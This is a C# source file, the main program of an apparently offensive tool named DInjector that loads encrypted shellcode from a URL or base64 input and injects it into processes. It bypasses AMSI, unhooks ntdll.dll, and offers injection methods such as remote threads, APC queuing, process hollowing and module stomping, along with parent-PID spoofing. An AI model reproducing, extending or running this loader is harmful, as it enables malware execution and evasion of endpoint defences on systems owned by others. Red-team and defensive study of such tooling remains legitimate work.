using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Globalization;
using System.Collections.Generic;

using DI = DInvoke;

namespace DInjector
{
    public class Program
    {
        static void Execute(Dictionary<string, string> options)
        {
            // Bypass AMSI (current process)
            try
            {
                bool localAm51 = false, forceLocalAm51 = false;
                if (options["/am51"].ToUpper() == "FORCE")
                    localAm51 = forceLocalAm51 = true;
                else if (bool.Parse(options["/am51"]))
                    localAm51 = true;

                if (localAm51)
                    AM51.Patch(force: forceLocalAm51);
            }
            catch (Exception)
            { }

            // Unhook ntdll.dll
            try
            {
                if (bool.Parse(options["/unhook"]))
                    Unhooker.Unhook();
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
                if (item.Value == string.Empty)
                    commandName = item.Key;

            string shellcodePath = null;
            try
            {
                shellcodePath = options["/sc"];
            }
            catch
            {
                Console.WriteLine("Missing required parameter \"/sc !\"");
                return;
            }

            string password = null;
            try
            {
                password = options["/p"];
            }
            catch { }

            byte[] shellcodeEncrypted;
            if (shellcodePath.StartsWith("http", ignoreCase: true, culture: new CultureInfo("en-US")))
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
            }

            byte[] shellcodeBytes = null;
            if (password != null)
            {
                AES ctx = new AES(password);
                shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
            }
            else
            {
                shellcodeBytes = shellcodeEncrypted; // No password specified
            }

            int flipSleep = 0;
            try
            {
                flipSleep = int.Parse(options["/flipSleep"]);
            }
            catch (Exception)
            { }

            bool remoteAm51 = false, forceRemoteAm51 = false;
            try
            {
                if (options["/remoteAm51"].ToUpper() == "FORCE")
                    remoteAm51 = forceRemoteAm51 = true;
                else if (bool.Parse(options["/remoteAm51"]))
                    remoteAm51 = true;
            }
            catch (Exception)
            { }

            var ppid = 0;
            try
            {
                ppid = int.Parse(options["/ppid"]);
            }
            catch (Exception)
            { }

            var blockDlls = false;
            try
            {
                if (bool.Parse(options["/blockDlls"]))
                    blockDlls = true;
            }
            catch (Exception)
            { }

            var debug = false;
            try
            {
                if (bool.Parse(options["/debug"]))
                    debug = true;
            }
            catch (Exception)
            { }

            try
            {
                switch (commandName.ToLower())
                {
                    case "functionpointer":
                        FunctionPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "functionpointerunsafe":
                        FunctionPointerUnsafe.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "clipboardpointer":
                        ClipboardPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "timeformats":
                        TimeFormats.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "currentthread":
                        string strProtect = "RX";
                        try
                        {
                            strProtect = options["/protect"].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint protect = 0;
                        if (strProtect == "RWX")
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                        else // if (strProtect == "RX")
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;

                        uint timeout = 0;
                        try
                        {
                            timeout = uint.Parse(options["/timeout"]);
                        }
                        catch (Exception)
                        { }

                        string strFluctuate = "-1";
                        try
                        {
                            strFluctuate = options["/fluctuate"].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint fluctuate = 0;
                        if (strFluctuate == "RW")
                            fluctuate = DI.Data.Win32.WinNT.PAGE_READWRITE;
                        //else if (strFluctuate == "NA")
                        //fluctuate = DI.Data.Win32.WinNT.PAGE_NOACCESS;

                        CurrentThread.Execute(
                            shellcodeBytes,
                            protect,
                            timeout,
                            flipSleep,
                            fluctuate,
                            debug);
                        break;

                    case "currentthreaduuid":
                        string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                        CurrentThreadUuid.Execute(shellcodeUuids);
                        break;

                    case "remotethread":
                        RemoteThread.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreaddll":
                        RemoteThreadDll.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            options["/dll"],
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadview":
                        RemoteThreadView.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadsuspended":
                        if (flipSleep == 0)
                        {
                            var rand = new Random();
                            flipSleep = rand.Next(10000, 12500);
                        }

                        RemoteThreadSuspended.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            flipSleep,
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadkernelcb":
                        RemoteThreadKernelCB.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadapc":
                        RemoteThreadAPC.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadcontext":
                        RemoteThreadContext.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "processhollowing":
                        ProcessHollowing.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "modulestomping":
                        ModuleStomping.Execute(
                            shellcodeBytes,
                            options["/image"],
                            options["/stompDll"],
                            options["/stompExport"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.InnerException);
            }
        }

        public static int Main(string[] args)
        {
            
            if (args.Length == 0 || args[0] == "-h" || args[0] == "/?" || args[0] == "/h" || args[0] == "--help" || args[0] == "-help")
            {
                Console.WriteLine("See the DInjector page for usage info");
                return 0;
            }

            Console.WriteLine("Started DInjector...");
            Dictionary<string, string> options = ArgumentParser.Parse(args);
            Execute(options);
            return 0;
        }
    }
}
